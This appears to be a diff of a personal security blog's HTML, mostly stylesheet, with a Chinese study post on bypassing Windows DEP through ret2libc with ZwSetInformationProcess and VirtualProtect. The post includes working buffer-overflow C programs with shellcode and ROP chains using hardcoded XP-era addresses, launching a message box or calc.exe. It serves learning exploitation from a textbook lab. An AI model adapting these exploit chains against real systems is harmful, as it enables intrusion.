+.hljs-folder-branch.win {
+    width: 14px;
+    margin-right: 2px;
+}
+.hljs-folder-last-branch {
+    height: 7px;
+    width: 7px;
+    margin-left: 6px;
+    text-indent: -99em;
+    position: relative;
+    vertical-align: top;
+    display: inline-block;
+    border-bottom-width: 1px;
+    border-bottom-style: solid;
+    border-bottom-color: rgb(94, 144, 117);
+    border-left-width: 1px;
+    border-left-style: solid;
+    border-left-color: rgb(94, 144, 117);
+}
+.hljs-folder-last-branch.win {
+    width: 13px;
+    margin-right: 2px;
+}
+
+
+/**
+ * Treeview syntax highlighting based on highlight.js
+ */
+
+
+.mark{
+    border: 0;
+  background-color: rgba(221, 243, 231, 0.4);
+  border-radius: 4px;
+  color: #29754d;
+  font-size: 90%;
+  padding: 2px 4px;
+}
+.line_mark{
+    border: 1px dashed #3A4C42;
+    margin-top: 2px;
+}
+code .mark, .xiaoshujiang_code .mark{
+    border-radius: 0px;
+    font-size: initial;
+    padding: initial;
+}
+a.attachment{
+    background-color: #ecf0f3;
+    border: 1px solid #bec6cb;
+    display: inline-block;
+    padding: 5px;
+    margin: 2px;
+    min-width: 250px;
+}
+a.attachment i.fa{
+    font-size: 3em;
+  float: left;
+  margin-right: 0.2em;
+}
+a.attachment .filename{
+    vertical-align: top;
+  text-align: left;
+  font-weight: bold;
+}
+a.attachment .filesize{
+  display: -webkit-box;
+  display: -moz-box;
+  display: -ms-flexbox;
+  display: -webkit-flex;
+  display: flex;
+  opacity: .6;
+  font-size: 80%;
+  white-space: nowrap;
+}
+.checkbox .checked{
+    text-decoration: line-through;
+}
+.flow-chart, .sequence-diagram{
+    text-align: center;
+}
+.plot, .plot-image{
+    text-align: center;
+    min-height: 200px;
+    min-width: 200px;
+}
+
+pre, .xiaoshujiang_pre {
+    line-height: initial !important;
+    word-wrap: break-word;
+    word-break: break-word;
+    tab-size: 4;
+    white-space: pre-wrap;
+}
+.xiaoshujiang_code_container pre{
+    margin: 0px;
+}
+.xiaoshujiang_code_container.xiaoshujiang_code_chunk{
+    box-shadow: 0 0 0 1px #A3C293 inset,0 0 0 0 transparent;
+    margin: 1em 0;
+    padding: 1em;
+}
+.xiaoshujiang_code_container.xiaoshujiang_code_chunk_hide_code{
+    box-shadow: initial;
+    padding: initial;
+    padding-bottom: 2em;
+}
+.xiaoshujiang_code_container .out_put{
+    box-shadow: 0 0 0 1px #A3C293 inset,0 0 0 0 transparent;
+    margin: 1em 0;
+    background-color: #FCFFF5;
+    color: #2C662D;
+    padding: 1em;
+}
+.xiaoshujiang_code_container .out_put_error{
+    background-color: #FFF6F6;
+    color: #9F3A38;
+    margin: 1em 0;
+    box-shadow: 0 0 0 1px #E0B4B4 inset,0 0 0 0 transparent;
+    padding: 1em;
+}
+
+.xiaoshujiang_pre {
+    font-family: monospace;
+}
+
+.story_align_left, .story_align_left .story_image_container {
+    text-align: left;
+}
+.story_align_right, .story_align_right .story_image_container {
+    text-align: right;
+}
+.story_align_center, .story_align_center .story_image_container {
+    text-align: center;
+}
+.story_align_justify, .story_align_justify .story_image_container {
+    text-align: justify;
+}
+
+
+/** 
+ * code line nums
+ */
+code.hljs.code_linenums, .xiaoshujiang_code.hljs.code_linenums{
+    position: relative;
+}
+.ol_linenums{
+    padding: 0px;
+    margin-left: 30px;
+    border-left: 1px solid #e0e0e0;
+}
+.li_linenum{
+    margin-left: 10px;
+    list-style: none;
+    counter-increment: lines 1;
+}
+.li_linenum.li_list_style{
+    list-style: inherit;
+    margin-left: 5px;
+}
+.li_linenum:before, .li_linenum_before_span{
+    content: counter(lines, decimal);
+  position: absolute;
+  left: 0px;
+  text-align: center;
+  width: 2.5em;
+  vertical-align: top;
+}
+.li_linenum_before_span_hide{
+    display: none;
+}
+.xiaoshujiang_code .code_line_break_hack{
+    margin:0;
+    border:0;
+    border-top:0;
+    border-bottom:0;
+}
+/** 
+ * code line nums
+ */
+.mathjax-container{
+    text-align: center;
+}
+div.mathjax{
+    max-width: 600px;
+    margin: 0 auto;
+    font-size: 14px;
+}
+text{
+    font-size: 14px;
+}
+
+/**
+ * block image
+ */
+
+.story_image_container{
+    text-align: center;
+}
+.story_image_container>.story_image{
+    display: inline-block;
+  position: relative;
+    max-width: 80%;
+}
+.story_image_caption{
+    border-bottom: 1px solid #d9d9d9;
+    display: inline-block;
+    color: #999;
+    padding: 10px;
+}
+.story_image_blank_caption{
+    border-bottom: 0px;
+}
+/**
+.story_image:before, .story_image:after{
+    content: '';
+    position: absolute;
+    z-index: -2;
+    bottom: 13px;
+    left: 10px;
+    width: 50%;
+    height: 20%;
+    border-radius: 10px/90px;
+    box-shadow: 0 15px 10px rgba(0,0,0,0.7);
+    -webkit-transform: rotate(-3deg);
+    -moz-transform: rotate(-3deg);
+    -ms-transform: rotate(-3deg);
+    -o-transform: rotate(-3deg);
+    transform: rotate(-3deg);
+}
+.story_image:after {
+    right: 10px;
+    left: auto;
+    -webkit-transform: rotate(3deg);
+    -moz-transform: rotate(3deg);
+    -ms-transform: rotate(3deg);
+    -o-transform: rotate(3deg);
+    transform: rotate(3deg);
+}
+
+**/
+.story_image>img{
+    border-radius: 0.3125em;
+    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);
+}
+.story_inline_image>img{
+    max-width: 50%;
+    vertical-align: bottom;
+}
+.story_remote_resource_block{
+    text-align: center;
+}
+.xiaoshujiang_code_container {
+    margin: 1em 0px;
+    position: relative;
+    padding-bottom: 2em;
+}
+
+
+.xiaoshujiang_code_title_container{
+    font-size: 70%;
+    opacity: 0.5;
+}
+.xiaoshujiang_code_title_container>.xiaoshujiang_code_infos{
+    float: right;
+}
+
+
+.task-list-item{
+    list-style: none;
+}
+.task-list-item.li_list_style{
+    list-style:inherit;
+}
+.task-list-item>input{
+    margin: 0 0 0 -20px;
+}
+.video_container{
+    width: 100%;
+    display: table;
+    text-align: center;
+    position: relative;
+    padding-bottom: 56.25%!important;
+}
+.slideshare_container .inner{
+    position: relative;
+    width: 100%;
+}
+.slideshare_container .inner iframe{
+    width: 100%;
+    height: 100%;
+    position: absolute;
+    top: 0;
+    bottom: 0;
+    left: 0;
+    right: 0;
+}
+
+.video_container iframe{
+    width: 100%;
+    height: 100%;
+    position: absolute;
+    top: 0;
+    left: 0;
+    z-index: 1;
+    vertical-align: middle;
+}
+
+kbd{
+    display: inline-block;
+    padding: 3px 5px;
+    font-size: 11px;
+    line-height: 10px;
+    color: #555;
+    vertical-align: middle;
+    background-color: #fcfcfc;
+    border: solid 1px #ccc;
+    border-bottom-color: #bbb;
+    border-radius: 3px;
+    box-shadow: inset 0 -1px 0 #bbb;
+}
+
+.blank_anchor_id {
+    float: left;
+}
+.blank_anchor_id {
+    visibility: hidden;
+}
+.blank_anchor_id:before {
+    content: 'a';
+}
+
+blockquote footer{
+    margin: 1em 0;
+    font-style: italic;
+}
+
+blockquote footer cite {
+    margin: 0 1em;
+}
+/*wavedrom start*/
+
+.wavedrom_svg text, .wavedrom_svg_defs text {
+    font-size:11pt;
+    font-style:normal;
+    font-variant:normal;
+    font-weight:normal;
+    font-stretch:normal;
+    text-align:center;
+    fill-opacity:1;
+    font-family:Helvetica
+}
+.wavedrom_svg .muted, .wavedrom_svg_defs .muted {
+    fill:#aaa
+}
+.wavedrom_svg .warning, .wavedrom_svg_defs .warning {
+    fill:#f6b900
+}
+.wavedrom_svg .error, .wavedrom_svg_defs .error {
+    fill:#f60000
+}
+.wavedrom_svg .info, .wavedrom_svg_defs .info {
+    fill:#0041c4
+}
+.wavedrom_svg .success, .wavedrom_svg_defs .success {
+    fill:#00ab00
+}
+.wavedrom_svg .h1, .wavedrom_svg_defs .h1 {
+    font-size:33pt;
+    font-weight:bold
+}
+.wavedrom_svg .h2, .wavedrom_svg_defs .h2 {
+    font-size:27pt;
+    font-weight:bold
+}
+.wavedrom_svg .h3, .wavedrom_svg_defs .h3 {
+    font-size:20pt;
+    font-weight:bold
+}
+.wavedrom_svg .h4, .wavedrom_svg_defs .h4 {
+    font-size:14pt;
+    font-weight:bold
+}
+.wavedrom_svg .h5, .wavedrom_svg_defs .h5 {
+    font-size:11pt;
+    font-weight:bold
+}
+.wavedrom_svg .h6, .wavedrom_svg_defs .h6 {
+    font-size:8pt;
+    font-weight:bold
+}
+.wavedrom_svg_defs .s1 {
+    fill:none;
+    stroke:#000;
+    stroke-width:1;
+    stroke-linecap:round;
+    stroke-linejoin:miter;
+    stroke-miterlimit:4;
+    stroke-opacity:1;
+    stroke-dasharray:none
+}
+.wavedrom_svg_defs .s2 {
+    fill:none;
+    stroke:#000;
+    stroke-width:0.5;
+    stroke-linecap:round;
+    stroke-linejoin:miter;
+    stroke-miterlimit:4;
+    stroke-opacity:1;
+    stroke-dasharray:none
+}
+.wavedrom_svg_defs .s3 {
+    color:#000;
+    fill:none;
+    stroke:#000;
+    stroke-width:1;
+    stroke-linecap:round;
+    stroke-linejoin:miter;
+    stroke-miterlimit:4;
+    stroke-opacity:1;
+    stroke-dasharray:1,3;
+    stroke-dashoffset:0;
+    marker:none;
+    visibility:visible;
+    display:inline;
+    overflow:visible;
+    enable-background:accumulate
+}
+.wavedrom_svg_defs .s4 {
+    color:#000;
+    fill:none;
+    stroke:#000;
+    stroke-width:1;
+    stroke-linecap:round;
+    stroke-linejoin:miter;
+    stroke-miterlimit:4;
+    stroke-opacity:1;
+    stroke-dasharray:none;
+    stroke-dashoffset:0;
+    marker:none;
+    visibility:visible;
+    display:inline;
+    overflow:visible
+}
+.wavedrom_svg_defs .s5 {
+    fill:#fff;
+    stroke:none
+}
+.wavedrom_svg_defs .s6 {
+    color:#000;
+    fill:#ffffb4;
+    fill-opacity:1;
+    fill-rule:nonzero;
+    stroke:none;
+    stroke-width:1px;
+    marker:none;
+    visibility:visible;
+    display:inline;
+    overflow:visible;
+    enable-background:accumulate
+}
+.wavedrom_svg_defs .s7 {
+    color:#000;
+    fill:#ffe0b9;
+    fill-opacity:1;
+    fill-rule:nonzero;
+    stroke:none;
+    stroke-width:1px;
+    marker:none;
+    visibility:visible;
+    display:inline;
+    overflow:visible;
+    enable-background:accumulate
+}
+.wavedrom_svg_defs .s8 {
+    color:#000;
+    fill:#b9e0ff;
+    fill-opacity:1;
+    fill-rule:nonzero;
+    stroke:none;
+    stroke-width:1px;
+    marker:none;
+    visibility:visible;
+    display:inline;
+    overflow:visible;
+    enable-background:accumulate
+}
+.wavedrom_svg_defs .s9 {
+    fill:#000;
+    fill-opacity:1;
+    stroke:none
+}
+.wavedrom_svg_defs .s10 {
+    color:#000;
+    fill:#fff;
+    fill-opacity:1;
+    fill-rule:nonzero;
+    stroke:none;
+    stroke-width:1px;
+    marker:none;
+    visibility:visible;
+    display:inline;
+    overflow:visible;
+    enable-background:accumulate
+}
+.wavedrom_svg_defs .s11 {
+    fill:#0041c4;
+    fill-opacity:1;
+    stroke:none
+}
+.wavedrom_svg_defs .s12 {
+    fill:none;
+    stroke:#0041c4;
+    stroke-width:1;
+    stroke-linecap:round;
+    stroke-linejoin:miter;
+    stroke-miterlimit:4;
+    stroke-opacity:1;
+    stroke-dasharray:none
+}
+
+
+/*wavedrom stop*/
+
+.mermaid_svg{
+font-family: monospace;
+}
+
+@media print{
+  body{
+  word-wrap: break-word;
+  word-break: break-word;
+  background: initial;
+}
+}
+
+/*
+
+Orginal Style from ethanschoonover.com/solarized (c) Jeremy Hull <sourdrums@gmail.com>
+
+*/
+
+.hljs {
+  display: block;
+  overflow-x: auto;
+  padding: 0.5em;
+  background: #fdf6e3;
+  color: #657b83;
+}
+
+.hljs-comment,
+.hljs-quote {
+  color: #93a1a1;
+}
+
+/* Solarized Green */
+.hljs-keyword,
+.hljs-selector-tag,
+.hljs-addition {
+  color: #859900;
+}
+
+/* Solarized Cyan */
+.hljs-number,
+.hljs-string,
+.hljs-meta .hljs-meta-string,
+.hljs-literal,
+.hljs-doctag,
+.hljs-regexp {
+  color: #2aa198;
+}
+
+/* Solarized Blue */
+.hljs-title,
+.hljs-section,
+.hljs-name,
+.hljs-selector-id,
+.hljs-selector-class {
+  color: #268bd2;
+}
+
+/* Solarized Yellow */
+.hljs-attribute,
+.hljs-attr,
+.hljs-variable,
+.hljs-template-variable,
+.hljs-class .hljs-title,
+.hljs-type {
+  color: #b58900;
+}
+
+/* Solarized Orange */
+.hljs-symbol,
+.hljs-bullet,
+.hljs-subst,
+.hljs-meta,
+.hljs-meta .hljs-keyword,
+.hljs-selector-attr,
+.hljs-selector-pseudo,
+.hljs-link {
+  color: #cb4b16;
+}
+
+/* Solarized Red */
+.hljs-built_in,
+.hljs-deletion {
+  color: #dc322f;
+}
+
+.hljs-formula {
+  background: #eee8d5;
+}
+
+.hljs-emphasis {
+  font-style: italic;
+}
+
+.hljs-strong {
+  font-weight: bold;
+}
+
+
+
+</style>
+</head><body>
+<div><div class="preview" id="wmd-preview">
+
+	<div class="preview html_preview"><h1 class="story_title">安全机制 DEP 绕过</h1><div class="story_tags"><div class="tag blue label">机制</div><div class="tag blue label">DEP</div></div><div class="xiaoshujiang_element xsj_anchor" style="position: absolute;">
+  <a name="0x0120e7ae80e4bb8b_1" class="blank_anchor_name"></a><a id="0x0120e7ae80e4bb8b_1" class="blank_anchor_id"></a><a name="0x01-简介" class="blank_anchor_name"></a><a id="0x01-简介" class="blank_anchor_id"></a>
+</div>
+<h1>0x01 简介</h1>
+<p>DEP （Data Execution Prevention）数据保护机制，在XP SP3被引入，将地址改为不可执行，使得shellcode无法在指定位置执行。</p>
+<div class="xiaoshujiang_element xsj_anchor" style="position: absolute;">
+  <a name="0x0220e7bb95e8bf87e696b9e6b395_2" class="blank_anchor_name"></a><a id="0x0220e7bb95e8bf87e696b9e6b395_2" class="blank_anchor_id"></a><a name="0x02-绕过方法" class="blank_anchor_name"></a><a id="0x02-绕过方法" class="blank_anchor_id"></a>
+</div>
+<h1>0x02 绕过方法</h1>
+<p>主要还是了解现有的一些绕过方法，0day漏洞上介绍了几种方法</p>
+<ol>
+<li>Ret2libc ZwSetInformationProcess</li>
+<li>Ret2libc VirtualProtect</li>
+<li>Ret2libc VirtualAlloc</li>
+<li>利用可执行内存</li>
+<li><a href="http://xn--kcr066f.NET" target="_blank" rel="external">利用.NET</a></li>
+<li>利用Java applet</li>
+</ol>
+<p>大体上分为两种</p>
+<ol>
+<li>利用可执行内存</li>
+<li>直接关闭DEP</li>
+</ol>
+<p></p><div class="story_image_container story_block_image"><div class="story_image"><img src="/2017/10/13/安全机制 DEP 绕过/1201-e1408992591802.png" alt="" title="" name="images/1201-e1408992591802.png"></div><br><div class="story_image_caption story_image_blank_caption"></div></div><p></p>
+<div class="xiaoshujiang_element xsj_anchor" style="position: absolute;">
+  <a name="0x0320e5ae9ee9aa8c_3" class="blank_anchor_name"></a><a id="0x0320e5ae9ee9aa8c_3" class="blank_anchor_id"></a><a name="0x03-实验" class="blank_anchor_name"></a><a id="0x03-实验" class="blank_anchor_id"></a>
+</div>
+<h1>0x03 实验</h1>
+<p>跟着书上的实验一步一步调吧，主要还是思想，学会思考的过程并不是为了最后的弹框，shellcode直接使用书上提供的健壮的代码</p>
+<div class="xiaoshujiang_element xsj_anchor" style="position: absolute;">
+  <a name="0x120ret2libc20zwsetinformationprocess_4" class="blank_anchor_name"></a><a id="0x120ret2libc20zwsetinformationprocess_4" class="blank_anchor_id"></a><a name="0x1-ret2libc-zwsetinformationprocess" class="blank_anchor_name"></a><a id="0x1-ret2libc-zwsetinformationprocess" class="blank_anchor_id"></a>
+</div>
+<h2>0x1 Ret2libc ZwSetInformationProcess</h2>
+<p>进程的 DEP 设置标识保存在 KPROCESS 结构中的 _KEXECUTE_OPTIONS 上，而这个标识可以通过 API函数 ZwQueryInformationProcess 和 Zw SetInformationProcess 进行查询和修改，所以可以直接将进程的 DEP 保护关闭。</p>
+<p>_KEXECUTE_OPTIONS 的结构</p>
+<div class="xiaoshujiang_code_container"><pre><code data-info=" " class="nohighlight hljs">typedef struct _KEXECUTE_OPTIONS
+{
+UCHAR Value; 
+/*
+Pos0ExecuteDisable :1bit
+Pos1ExecuteEnable :1bit
+Pos2DisableThunkEmulation :1bit
+Pos3Permanent :1bit
+Pos4ExecuteDispatchEnable :1bit
+Pos5ImageDispatchEnable :1bit
+Pos6Spare :2bit
+*/
+} KEXECUTE_OPTIONS;
+</code></pre></div>
+<p>了解了_KEXECUTE_OPTIONS的结构就可以用setinformationprocess设置相应的值，只需将第二位设置位1即可，所以关闭DEP的设置为</p>
+<div class="xiaoshujiang_code_container"><pre><code data-info=" " class="nohighlight hljs">ULONG ExecuteFlags = MEM_EXECUTE_OPTION_ENABLE;
+ZwSetInformationProcess(
+NtCurrentProcess(),  // (HANDLE)-1
+ProcessExecuteFlags, // 0x22
+&amp;ExecuteFlags, 		 // ptr to 0x2
+sizeof(ExecuteFlags)); // 0x4
+</code></pre></div>
+<p>Q：这里有个问题为什么不直接传参调用函数执行<br>
+A：答案是这里用的strcpy是，如果直接传参那么参数中肯定会有零字节，所以想到了利用现有的函数调用</p>
+<p>T：因为微软为兼容性考虑，如果一个进程的 Permanent 位没有设置，当它加载 DLL时，系统就会对这个 DLL 进行 DEP 兼容性检查，当存在兼容性问题时进程的 DEP 就会被关闭</p>
+<p>这是利用这一个trick，绕过DEP，微软设立了一个函数LdrpCheckNXCompatibility<br>
+满足下面三个条件之一就会触发</p>
+<ol>
+<li>当 DLL 受 SafeDisc 版权保护系统保护时；</li>
+<li>当 DLL 包含有.aspcak、.pcle、.sforce 等字节时；</li>
+<li>Windows Vista 下面当 DLL 包含在注册表“HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\ Windows NT\CurrentVersion\Image File Execution Options\DllNXOptions”</li>
+</ol>
+<p>T：我们可以利用ollyfindaddr插件寻找关闭DEP的起始位置，同时还有一些其他的辅助地址</p>
+<p></p><div class="story_image_container story_block_image"><div class="story_image"><img src="/2017/10/13/安全机制 DEP 绕过/2017-10-06 23-26-10屏幕截图.png" alt="" title="" name="images/2017-10-06 23-26-10屏幕截图.png"></div><br><div class="story_image_caption story_image_blank_caption"></div></div><p></p>
+<p><strong>shellcode的探索过程</strong></p>
+<p>T：retn x指令可以构造rop链，当然执行过程可以归结为下面一句话，在执行当前语句时他的下一条指令是esp的指向，下下一条指令则是esp+4+x，因此rop链的执行顺序就确定了</p>
+<blockquote>
+<p>为了满足第一个条件必须将al设置为1，这里利用了一个rop链，但是接着发现在执行关闭DEP代码的时候ebp地址不可写，所以要在关闭DEP之前将可赋值地址写入ebp中，接着又发现esp不够高使得shellcode的被破坏，所以要抬高esp，下面才是执行DEP，还有一个坑在DEP的最后有一个leave操作所以，最后esp=ebp+4所以在retn的时候是返回到ebp+4的位置我们还记得给ebp赋值吗，没错就是这么巧妙，esp再次回去而且是jmp esp的位置一切都是这么巧妙。看起来是偶然的东西其实都是我们一手安排的。</p>
+</blockquote>
+<p>贴出代码</p>
+<div class="xiaoshujiang_code_container"><pre><code data-info=" " class="nohighlight hljs">#include&lt;stdlib.h&gt; 
+#include&lt;string.h&gt; 
+#include&lt;stdio.h&gt; 
+#include&lt;windows.h&gt; 
+char shellcode[]=  
+"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"  
+"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"  
+"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"  
+"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"  
+"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"  
+"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"  
+"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"  
+"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"  
+"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"  
+"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"  
+"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"  
+"\x90\x90\x90\x90"  
+"\x52\xE2\x92\x7C"//MOV EAX,1 RETN地址  
+"\x85\x8B\x1D\x5D"//修正EBP  
+//"\x19\x4A\x97\x7C"//增大ESP  
+"\x45\x01\x88\x7c"
+"\xB4\xC1\xC5\x7D"//jmp esp  
+"\x24\xCD\x93\x7C"//关闭DEP代码的起始位置  
+"\xE9\x33\xFF\xFF"//回跳指令  
+"\xFF\x90\x90\x90"  
+;  
+void test()  
+{  
+      char tt[176];  
+      strcpy(tt,shellcode);  
+}  
+int main()  
+{  
+      HINSTANCE hInst = LoadLibrary("shell32.dll");  
+      char temp[200];  
+      test();  
+      return 0;  
+}  
+</code></pre></div>
+<p>或者用</p>
+<div class="xiaoshujiang_code_container"><pre><code data-info=" " class="nohighlight hljs">"\x52\xE2\x92\x7C"//MOV EAX,1 RETN地址 
+"\x96\x73\x1B\x5D"//修正EBP 8
+"\x85\x8B\x1D\x5D"//ebp 4
+"\x90\x90\x90\x90"
+"\x90\x90\x90\x90"
+//"\x19\x4A\x97\x7C"//增大ESP  
+"\x45\x01\x88\x7c"//esp up
+"\xB4\xC1\xC5\x7D"//jmp esp  
+"\x24\xCD\x93\x7C"//关闭DEP代码的起始位置  
+"\xE9\x27\xFF\xFF"//回跳指令  
+"\xFF\x90\x90\x90"  
+</code></pre></div>
+<p>都是可以的只要是明白了retn的精髓那么构造shellcode就不是问题</p>
+<div class="xiaoshujiang_element xsj_anchor" style="position: absolute;">
+  <a name="0x220vitualprotect_5" class="blank_anchor_name"></a><a id="0x220vitualprotect_5" class="blank_anchor_id"></a><a name="0x2-vitualprotect" class="blank_anchor_name"></a><a id="0x2-vitualprotect" class="blank_anchor_id"></a>
+</div>
+<h2>0x2 VitualProtect</h2>
+<div class="xiaoshujiang_code_container"><pre><code data-info=" " class="nohighlight hljs"> 
+// GS_Virtual.cpp : 定义控制台应用程序的入口点。  
+//  
+  
+#include &lt;stdlib.h&gt;  
+#include &lt;string.h&gt;  
+#include &lt;stdio.h&gt;  
+#include &lt;windows.h&gt;  
+char shellcode[]=  
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"  
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"  
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"  
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"  
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"  
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"  
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"  
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"  
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"  
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"  
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"  
+"\x90\x90\x90\x90"  
+  
+"\x94\xb0\x6c\x7d"   //0x7d6cb094 pop eax  ret  
+//"\x34\x7a\xc1\x77"   //POP EBX POP ESI POP EDI  RETN at 0x77c17a34     
+//"\x26\x62\x92\x7d" //POP ECX POP ECX POP ECX  RETN at 0x7d926226  
+"\x69\x36\x5C\x7D"    // pop edi,pop ebx,pop esi,retn  
+"\xe5\xe0\x72\x7d"   //0x7d72e0e5  push esp pop ebp ret 4  
+"\x24\x01\x6f\x7d"   //ret   
+"\x90\x90\x90\x90"  
+"\xc6\xc6\xeb\x77"   //77ebc6c6  push esp jmp eax  
+"\x10\x01\x00\x00"   //要修改的内存大小  
+"\x40\x00\x00\x00"   //可读可写可执行属性代码  
+"\xc6\xc6\xeb\x77"   //77ebc6c6  push esp jmp eax  
+  
+"\x90\x90\x90\x90"  
+"\x90\x90\x90\x90"  
+"\xD9\x1A\x80\x7C"//修改内存属性  
+  
+"\x90\x90\x90\x90"  
+"\xEB\x30\x5A\x7D"//jmp esp  
+  
+"\x90\x90\x90\x90"  
+"\x90\x90\x90\x90"  
+"\x90\x90\x90\x90"  
+"\x90\x90\x90\x90"  
+  
+"\x90\x90\x90\x90"  
+"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"  
+"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"  
+"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"  
+"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"  
+"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"  
+"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"  
+"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"  
+"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"  
+"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"  
+"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"  
+"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"  
+"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"  
+"\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"  
+;  
+void test()  
+{  
+    char tt[176];  
+    printf("ttttttttttttttttttttt\n");  
+    memcpy(tt,shellcode,sizeof(shellcode) + 1);  
+}  
+int main()  
+{  
+    HINSTANCE hInst = LoadLibrary("shell32.dll");  
+    char temp[200];  
+    test();  
+    return 0;  
+}  
+</code></pre></div>
+</div>
+
+</div></div>
+</body></html>
+
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/10/11/Untitled/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/10/11/Untitled/" itemprop="url">哈哈哈</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-10-11T20:15:18+08:00">
+                2017-10-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="hahaha"><a href="#hahaha" class="headerlink" title="hahaha"></a>hahaha</h2>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/10/11/世安杯WP/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -317,7 +2005,7 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Posted on</span>
               
               <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-10-11T00:36:30+08:00">
                 2017-10-11
@@ -463,7 +2151,7 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Posted on</span>
               
               <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-10-10T01:42:02+08:00">
                 2017-10-10
@@ -591,7 +2279,7 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               
